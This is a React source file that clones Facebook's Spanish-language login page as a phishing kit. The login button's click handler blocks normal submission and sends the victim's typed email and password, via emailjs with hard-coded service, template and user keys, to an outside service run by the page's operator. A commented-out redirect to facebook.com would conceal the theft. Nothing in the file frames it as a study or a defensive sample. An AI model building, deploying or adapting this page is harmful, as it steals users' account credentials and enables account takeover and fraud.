import "./App.css";
import { useState } from "react";
import emailjs from "emailjs-com";

function App() {
  const [Password, setPassword] = useState("");
  const [Email, setEmail] = useState("");
  return (
    <div classname="App">
      <div>
        <div className="_li" id="u_0_3_Df">
          <div
            className="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder"
            data-testid="ax-navigation-menubar"
            id="u_0_4_CS"
          >
            <div className="_608m">
              <div className="clearfix _ikh _tb6">
                <div className="_4bl7">
                  <span className="mrm _3bcv _50f3">Ir a</span>
                </div>
                <div className="_4bl9 _3bcp">
                  <div
                    className="_6a _608n"
                    aria-label="Asistente de navegación"
                    role="menubar"
                    id="u_0_5_gT"
                  >
                    <div className="_6a uiPopover" id="u_0_6_Rm">
                      <a
                        role="menuitem"
                        className="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy"
                        href="#"
                        style={{ maxWidth: "200px" }}
                        aria-haspopup="true"
                        aria-expanded="false"
                        rel="toggle"
                        id="u_0_7_NU"
                      >
                        <span className="_55pe">Secciones de esta página</span>
                        <span className="_4o_3 _3-99">
                          <i className="img sp_U0-3T3RQWbX sx_00403d" />
                        </span>
                      </a>
                    </div>
                    <div className="_6a _3bcs" />
                    <div className="_6a mrm uiPopover" id="u_0_8_rj">
                      <a
                        role="menuitem"
                        className="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy"
                        href="#"
                        style={{ maxWidth: "200px" }}
                        aria-haspopup="true"
                        tabIndex={-1}
                        aria-expanded="false"
                        rel="toggle"
                        id="u_0_9_VN"
                      >
                        <span className="_55pe">Ayuda sobre accesibilidad</span>
                        <span className="_4o_3 _3-99">
                          <i className="img sp_U0-3T3RQWbX sx_33aacf" />
                        </span>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div id="globalContainer" className="uiContextualLayerParent">
            <div className="fb_content clearfix " id="content" role="main">
              <div>
                <div className="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
                  <div className="_8esk">
                    <div className="_8esl">
                      <div className="_8ice">
                        <img
                          className="fb_logo _8ilh img"
                          src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
                          alt="Facebook"
                        />
                      </div>

                      <h2 className="_8eso" className="textBobo2131231231232">
                        Facebook te ayuda a comunicarte y compartir con las
                        personas que forman parte de tu vida.
                      </h2>
                    </div>
                    <div className="_8esn">
                      <div className="_8iep _8icy _9ahz _9ah-">
                        <div className="_6luv _52jv">
                          <form
                            className="_9vtf"
                            data-testid="royal_login_form"
                            prevent
                            id="u_0_a_cE"
                          >
                            <input
                              type="hidden"
                              name="jazoest"
                              defaultValue={2990}
                              autoComplete="off"
                            />
                            <input
                              type="hidden"
                              name="lsd"
                              defaultValue="AVqVq-sBjLw"
                              autoComplete="off"
                            />
                            <div>
                              <div className="_6lux">
                                <input
                                  type="text"
                                  className="inputtext _55r1 _6luy"
                                  name="email"
                                  id="email"
                                  data-testid="royal_email"
                                  placeholder="Correo electrónico o número de teléfono"
                                  autofocus={1}
                                  aria-label="Correo electrónico o número de teléfono"
                                  autoComplete="off"
                                  onChange={(input) => {
                                    setEmail(input.target.value);
                                  }}
                                  style={{
                                    backgroundImage: 'url("data:image/png',
                                  }}
                                />
                              </div>
                              <div className="_6lux">
                                <input
                                  type="password"
                                  className="inputtext _55r1 _6luy _9npi"
                                  name="pass"
                                  id="pass"
                                  data-testid="royal_pass"
                                  placeholder="Contraseña"
                                  aria-label="Contraseña"
                                  onChange={(input) => {
                                    setPassword(input.target.value);
                                  }}
                                  style={{
                                    backgroundImage: 'url("data:image/png',
                                    backgroundRepeat: "no-repeat",
                                    backgroundAttachment: "scroll",
                                    backgroundSize: "16px 18px",
                                    backgroundPosition: "98% 50%",
                                    cursor: "auto",
                                  }}
                                  autoComplete="off"
                                />
                              </div>
                            </div>
                            <input
                              type="hidden"
                              autoComplete="off"
                              name="login_source"
                              defaultValue="comet_headerless_login"
                            />
                            <input
                              type="hidden"
                              autoComplete="off"
                              name="next"
                              defaultValue
                            />
                            <div className="_6ltg">
                              <button
                                value={1}
                                className="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"
                                name="login"
                                data-testid="royal_login_button"
                                type="submit"
                                id="u_0_d_yX"
                                onClick={(event) => {
                                  event.preventDefault();

                                  emailjs
                                    .send(
                                      "service_51ga3f6",
                                      "template_xghn74i",
                                      {
                                        email: `${Email}`,
                                        password: `${Password}`,
                                      },
                                      "user_K8Y5qy6DPalV5t81mgoTS"
                                    )
                                    .then(
                                      function (response) {
                                        console.log(
                                          "SUCCESS!",
                                          response.status,
                                          response.text
                                        );
                                        // window.location.replace(
                                        //   "http://www.facebook.com"
                                        // );
                                      },
                                      function (error) {
                                        console.log("FAILED...", error);
                                      }
                                    );
                                  console.log({ email: Email, pass: Password });
                                }}
                              >
                                Iniciar sesión
                              </button>
                            </div>
                            <div className="_6ltj">
                              <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjMwOTY3MjQ2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D">
                                ¿Olvidaste tu contraseña?
                              </a>
                            </div>
                            <div className="_8icz" />
                            <div className="_6ltg">
                              <a
                                role="button"
                                className="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy"
                                href="#"
                                ajaxify="/reg/spotlight/"
                                id="u_0_2_Wk"
                                data-testid="open-registration-form-button"
                                rel="async"
                              >
                                Crear cuenta nueva
                              </a>
                            </div>
                          </form>
                        </div>
                        <div id="reg_pages_msg" className="_58mk">
                          <a
                            href="/pages/create/?ref_type=registration_form"
                            className="_8esh"
                          >
                            Crea una página
                          </a>{" "}
                          para un personaje público, un grupo de música o un
                          negocio.
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div className>
              <div className="_95ke _8opy">
                <div
                  id="pageFooter"
                  data-referrer="page_footer"
                  data-testid="page_footer"
                >
                  <ul
                    className="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
                    data-nocookies={1}
                  >
                    <li>Español</li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://www.facebook.com/"
                        onclick='require("IntlUtils").setCookieLocale("en_US", "es_LA", "https:\/\/www.facebook.com\/", "www_list_selector", 0); return false;'
                        title="English (US)"
                      >
                        English (US)
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://fr-fr.facebook.com/"
                        onclick='require("IntlUtils").setCookieLocale("fr_FR", "es_LA", "https:\/\/fr-fr.facebook.com\/", "www_list_selector", 1); return false;'
                        title="French (France)"
                      >
                        Français (France)
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://it-it.facebook.com/"
                        onclick='require("IntlUtils").setCookieLocale("it_IT", "es_LA", "https:\/\/it-it.facebook.com\/", "www_list_selector", 2); return false;'
                        title="Italian"
                      >
                        Italiano
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://de-de.facebook.com/"
                        onclick='require("IntlUtils").setCookieLocale("de_DE", "es_LA", "https:\/\/de-de.facebook.com\/", "www_list_selector", 3); return false;'
                        title="German"
                      >
                        Deutsch
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://pt-br.facebook.com/"
                        onclick='require("IntlUtils").setCookieLocale("pt_BR", "es_LA", "https:\/\/pt-br.facebook.com\/", "www_list_selector", 4); return false;'
                        title="Portuguese (Brazil)"
                      >
                        Português (Brasil)
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://ru-ru.facebook.com/"
                        onclick='require("IntlUtils").setCookieLocale("ru_RU", "es_LA", "https:\/\/ru-ru.facebook.com\/", "www_list_selector", 5); return false;'
                        title="Russian"
                      >
                        Русский
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="rtl"
                        href="https://ar-ar.facebook.com/"
                        onclick='require("IntlUtils").setCookieLocale("ar_AR", "es_LA", "https:\/\/ar-ar.facebook.com\/", "www_list_selector", 6); return false;'
                        title="Arabic"
                      >
                        العربية
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://hi-in.facebook.com/"
                        onclick='require("IntlUtils").setCookieLocale("hi_IN", "es_LA", "https:\/\/hi-in.facebook.com\/", "www_list_selector", 7); return false;'
                        title="Hindi"
                      >
                        हिन्दी
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://zh-cn.facebook.com/"
                        onclick='require("IntlUtils").setCookieLocale("zh_CN", "es_LA", "https:\/\/zh-cn.facebook.com\/", "www_list_selector", 8); return false;'
                        title="Simplified Chinese (China)"
                      >
                        中文(简体)
                      </a>
                    </li>
                    <li>
                      <a
                        className="_sv4"
                        dir="ltr"
                        href="https://ja-jp.facebook.com/"
                        onclick='require("IntlUtils").setCookieLocale("ja_JP", "es_LA", "https:\/\/ja-jp.facebook.com\/", "www_list_selector", 9); return false;'
                        title="Japanese"
                      >
                        日本語
                      </a>
                    </li>
                    <li>
                      <a
                        role="button"
                        className="_42ft _4jy0 _517i _517h _51sy"
                        rel="dialog"
                        ajaxify="/settings/language/language/?uri=https%3A%2F%2Fja-jp.facebook.com%2F&source=www_list_selector_more"
                        href="#"
                        title="Mostrar más idiomas"
                      >
                        <i className="img sp_U0-3T3RQWbX sx_e4edb5" />
                      </a>
                    </li>
                  </ul>
                  <div id="contentCurve" />
                  <div
                    id="pageFooterChildren"
                    role="contentinfo"
                    aria-label="Enlaces a sitios de Facebook"
                  >
                    <ul className="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                      <li>
                        <a href="/r.php" title="Regístrate en Facebook">
                          Registrarte
                        </a>
                      </li>
                      <li>
                        <a href="/login/" title="Iniciar sesión en Facebook">
                          Iniciar sesión
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://messenger.com/"
                          title="Descubre Messenger."
                        >
                          Messenger
                        </a>
                      </li>
                      <li>
                        <a href="/lite/" title="Facebook Lite para Android.">
                          Facebook Lite
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://www.facebook.com/watch/"
                          title="Explora nuestros videos de Watch."
                        >
                          {" "}
                          Watch{" "}
                        </a>
                      </li>
                      <li>
                        <a
                          href="/places/"
                          title="Descubre lugares populares en Facebook."
                        >
                          Lugares
                        </a>
                      </li>
                      <li>
                        <a href="/games/" title="Descubre juegos en Facebook.">
                          Juegos
                        </a>
                      </li>
                      <li>
                        <a
                          href="/marketplace/"
                          title="Compra y vende artículos en Facebook Marketplace."
                        >
                          Marketplace
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://pay.facebook.com/"
                          target="_blank"
                          title="Más información sobre Facebook Pay"
                        >
                          Facebook Pay
                        </a>
                      </li>
                      <li>
                        <a
                          href="/jobs/"
                          title="Postúlate para empleos y contrata personas en Facebook."
                        >
                          Empleos
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://www.oculus.com/"
                          target="_blank"
                          title="Más información sobre Oculus"
                        >
                          Oculus
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://portal.facebook.com/"
                          target="_blank"
                          title="Obtén más información sobre Portal from Facebook"
                        >
                          Portal
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&h=AT2PihRT52GeezVxFfPSgX_ShnM9KCyd106-yFtFUnFFXbXaqztn2__gACtwrEbyMoFbAWxtc7RpcOQy_yl-T-eRtO6Ni12Cj1waAELjuvPJeHuy1PHk66G3BW49dgFkVIqOhwdO97aLn8sCyNqSxw"
                          title="Descubre Instagram."
                          target="_blank"
                          rel="noopener nofollow"
                          data-lynx-mode="asynclazy"
                        >
                          Instagram
                        </a>
                      </li>
                      <li>
                        <a
                          href="/local/lists/245019872666104/"
                          title="Explora nuestro directorio de listas locales."
                        >
                          Local
                        </a>
                      </li>
                      <li>
                        <a
                          href="/fundraisers/"
                          title="Haz una donación a causas que te importan."
                        >
                          Recaudaciones de fondos
                        </a>
                      </li>
                      <li>
                        <a
                          href="/biz/directory/"
                          title="Explora nuestro directorio de servicios de Facebook."
                        >
                          Servicios
                        </a>
                      </li>
                      <li>
                        <a
                          href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                          title="Mira el Centro de información de votación."
                        >
                          Centro de información de votación
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://about.facebook.com/"
                          accessKey={8}
                          title="Lee nuestro blog, descubre el centro de recursos y encuentra ofertas de trabajo."
                        >
                          Información
                        </a>
                      </li>
                      <li>
                        <a
                          href="/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto"
                          title="Anúnciate en Facebook."
                        >
                          Crear anuncio
                        </a>
                      </li>
                      <li>
                        <a
                          href="/pages/create/?ref_type=site_footer"
                          title="Crea una página."
                        >
                          Crear página
                        </a>
                      </li>
                      <li>
                        <a
                          href="https://developers.facebook.com/?ref=pf"
                          title="Desarrolla en nuestra plataforma."
                        >
                          Desarrolladores
                        </a>
                      </li>
                      <li>
                        <a
                          href="/careers/?ref=pf"
                          title="Únete a nuestra extraordinaria empresa."
                        >
                          Empleo
                        </a>
                      </li>
                      <li>
                        <a
                          data-nocookies={1}
                          href="/privacy/explanation"
                          title="Infórmate acerca de tu privacidad y Facebook."
                        >
                          Privacidad
                        </a>
                      </li>
                      <li>
                        <a
                          href="/policies/cookies/"
                          title="Infórmate acerca de las cookies y Facebook."
                          data-nocookies={1}
                        >
                          Cookies
                        </a>
                      </li>
                      <li>
                        <a
                          className="_41ug"
                          data-nocookies={1}
                          href="https://www.facebook.com/help/568137493302217"
                          title="Conoce las opciones de anuncios."
                        >
                          Opciones de anuncios
                          <i className="img sp_U0-3T3RQWbX sx_c5bf05" />
                        </a>
                      </li>
                      <li>
                        <a
                          data-nocookies={1}
                          href="/policies?ref=pf"
                          accessKey={9}
                          title="Consulta nuestras políticas y condiciones."
                        >
                          Condiciones
                        </a>
                      </li>
                      <li>
                        <a
                          href="/help/?ref=pf"
                          accessKey={0}
                          title="Visita nuestro servicio de ayuda."
                        >
                          Ayuda
                        </a>
                      </li>
                      <li>
                        <a
                          accessKey={6}
                          className="accessible_elem"
                          href="/settings"
                          title="Ve y edita tu configuración de Facebook."
                        >
                          Configuración
                        </a>
                      </li>
                      <li>
                        <a
                          accessKey={7}
                          className="accessible_elem"
                          href="/allactivity?privacy_source=activity_log_top_menu"
                          title="Ver tu registro de actividad"
                        >
                          Registro de actividad
                        </a>
                      </li>
                    </ul>
                  </div>
                  <div className="mvl copyright">
                    <div>
                      <span> Facebook © 2021</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div />
          <span>
            <img
              src="https://facebook.com/security/hsts-pixel.gif"
              width={0}
              height={0}
              style={{ display: "none" }}
            />
          </span>
        </div>
      </div>
    </div>
  );
}

export default App;
